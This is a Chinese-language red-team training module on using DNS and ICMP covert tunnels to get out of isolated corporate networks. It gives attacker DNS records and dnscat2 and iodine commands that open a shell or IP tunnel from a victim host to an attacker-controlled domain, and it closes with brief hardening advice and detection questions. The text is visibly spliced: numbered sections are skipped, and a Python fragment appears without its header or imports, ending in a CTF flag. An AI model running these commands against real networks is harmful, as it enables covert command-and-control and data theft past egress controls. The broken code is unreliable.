# R20.5 DNS 與 ICMP 隱蔽隧道穿透受限網路 (DNS & ICMP Covert Tunneling)

---

## 🎯 作戰任務破題 (Tactical Objective & Mental Workflow)

**DNS 與 ICMP 隱蔽隧道穿透受限網路** 的物理本質為**利用企業網路邊界防火牆對基礎設施協定（DNS UDP 53 查詢請求、ICMP Echo 數據包）的過度信任與放行規則，當目標內網被嚴格隔離、禁止所有常規 TCP 出站連線（80/443 被完全封鎖）時，將欲傳輸的 TCP/IP 數據、交互式 Shell 或 C2 指令切割並編碼（Base32/Base64/十六進制）嵌入合法的 DNS 查詢標籤 (Labels) 或 ICMP Payload 資料負載中，透過公網權威 DNS 伺服器迭代解析或 ICMP 應答回帶實現隱蔽穿透**。在紅隊實戰中，這是突破高度封閉之核心隔離區（如金流專區、隔離工控網）的最後底牌。

```
[隔離核心內網受害主機 (阻斷所有 TCP 出站)]
          │
          ▼ 1. 將敏感數據編碼為 DNS 子域名標籤: a8f9c1.data.attacker-c2.com
[向內部合法 DNS 轉發器發起查詢] ── (UDP 53 埠被放行)
          │
          ▼ 2. 內部 DNS 依標準解析流程向外網根伺服器迭代
[全球網際網路 DNS 迭代解析鏈路]
          │
          ▼ 3. 請求最終抵達攻擊者控制的權威 DNS 伺服器 (NS 伺服器)
[紅隊權威 DNS 伺服器 (dnscat2 / Iodine 服務端)]
          │
          ▼ 4. 服務端提取 Base32 數據解密，並將下發指令藏於 TXT 記錄返回！
[成功在「零 TCP 連線」環境下建立雙向交互式隱蔽 Shell！]
```

## 🔬 第一動：DNS 封包結構、RFC 限制與 ICMP Echo 負載物理機制 (Mechanics & Covert Protocol)

### 1. DNS 隧道 (DNS Tunneling) 的協議限制與封裝
DNS 協議在 RFC 1035 中對封包有嚴格規範：
- 每個子域名標籤 (Label) 長度上限為 **63 個位元組**。
- 完整 FQDN 網域名稱長度上限為 **253 個位元組**。
- DNS 查詢標籤不區分大小寫，因此數據通常採用 **Base32** 編碼（僅使用 A-Z 與 2-7）。
- **下行資料傳輸**：伺服端將響應資料封裝於 `TXT` 記錄、`CNAME` 記錄或 `NULL` 記錄中回傳客戶端。

### 2. ICMP Echo 隧道 (PingTunnel) 運作原理
標準 ICMP Echo 請求 (Type 8) 與 Echo 回應 (Type 0) 封包內部允許夾帶自定義資料區塊（Data Payload，Windows 預設帶 32 位元組，Linux 預設帶 56 位元組）：
- 只要防火牆放行 Ping 探針出站，攻擊者可將真實的 TCP 串流分塊直接填充進 ICMP 的 Data 欄位中，經由目標端點向攻擊者 VPS 發送 ICMP Request，攻擊者透過 ICMP Reply 將回傳指令帶回受害者主機。

## ⚡ 第二動：戰術執行與工具鏈操作 (Attack Vectors & Exploitation)

### 1. 配置權威 DNS 記錄 (在網域名稱託管商配置)
```text
# 在 Cloudflare / GoDaddy 新增兩條記錄:
A  ns.c2-domain.com  ->  <攻擊者 VPS IP>
NS tunnel.c2-domain.com -> ns.c2-domain.com
```

### 2. 使用 dnscat2 搭建雙向加密控制通道
```bash
# 1. 在外網 VPS 啟動 dnscat2 伺服端
ruby dnscat2.rb tunnel.c2-domain.com --secret "RedTeamPass2026!"

# 2. 在受害目標主機 (Linux) 啟動客戶端發起隱蔽隧道
./dnscat --dns domain=tunnel.c2-domain.com --secret "RedTeamPass2026!"

# 若在 Windows 終端執行
dnscat2.exe --dns domain=tunnel.c2-domain.com --secret "RedTeamPass2026!"
```

### 3. 使用 Iodine 建立全功能 DNS IP 虛擬網卡 (L3 Tunnel)
```bash
# 服務端 (VPS) 啟動 iodine 服務端並指派虛擬私網 IP
iodined -f -c -P "SecretPass" 10.0.0.1 tunnel.c2-domain.com

# 客戶端 (受害主機) 連線建立 TUN 網卡
iodine -f -P "SecretPass" tunnel.c2-domain.com
```

## 🛡️ 第五動：工程級防禦基線 (Hardening Baselines)

1. **部署 DNS 響應策略區域 (RPZ - Response Policy Zones)**：
   - 內部 DNS 伺服器全面啟用威脅情報饋送，自動阻斷向新註冊域名 (NRD) 或低信譽 Dynamic DNS 發起的遞迴解析。
2. **嚴格限制邊界 ICMP 與非授權出站協議**：
   - 在網路邊界防火牆直接禁用所有對外的 ICMP Echo Request；內部伺服器僅允許向授權的企業 DNS 轉發器發起查詢。

    b32_data = base64.b32encode(data).decode().lower().replace("=", "")
    fqdn = f"{b32_data}.{domain}"
    print(f"[*] 原始載荷位元組: {data}")
    print(f"[!] 封裝後之 DNS 查詢 FQDN: {fqdn} (長度: {len(fqdn)})")
    if len(b32_data) <= 63:
        print("[+] 標籤長度合規 (<= 63 bytes)，可通過標準 DNS 協定轉發！")
    return fqdn

if __name__ == "__main__":
    encode_dns_tunnel_chunk()
    print("[+] FLAG{DNS_COVERT_TUNNELING_VERIFIED}")

## 🎯 作戰驗收檢查點 (Operational Checkpoints)

- [ ] **Q1：DNS 隱蔽隧道相較於常規 HTTP/SOCKS 穿透，在受限網路中有何不可替代性？**
  - **戰術思維**：受害主機完全不需要具備直接訪問外網的能力，只要它能向內網的內部 DNS 伺服器發起查詢，流量即可經由合法 DNS 遞迴鏈路被轉發至攻擊者權威 NS。
- [ ] **Q2：DNS 隧道通常採用 Base32 編碼而非 Base64，背後的協定物理原因是什麼？**
  - **戰術思維**：因為 DNS 協定對子網域名稱的解析是「不區分大小寫」的；Base64 依賴大小寫字母區分不同數值，容易在解析快取中被強制轉為小寫導致資料損壞。
- [ ] **Q3：什麼是 Iodine 工具？它與 dnscat2 相比在作戰層級上有何不同？**
  - **戰術思維**：dnscat2 偏向提供一個加密的指令交互 Shell；而 Iodine 直接在核心建立一個 L3 TUN 虛擬網卡，為攻擊者提供跨 DNS 的完整 IP 路由漫遊。
- [ ] **Q4：藍隊 SIEM 系統通常透過何種統計特徵模型識別出 DNS 隧道流量？**
  - **戰術思維**：監控 DNS 請求中高熵值 (Shannon Entropy) 子網域佔比、長度超過 50 位元組的異常查詢、以及 TXT/NULL 記錄的異常飆升與查詢頻率方差。
- [ ] **Q5：在完全隔離的封閉網路中，企業應如何徹底封死基於 DNS 的資料外洩路徑？**
  - **戰術思維**：內部 DNS 伺服器禁止直接向網際網路發起遞迴解析，所有對外查詢必須強制經由具備即時 DPI 檢查與威脅情資黑名單的過濾防火牆。
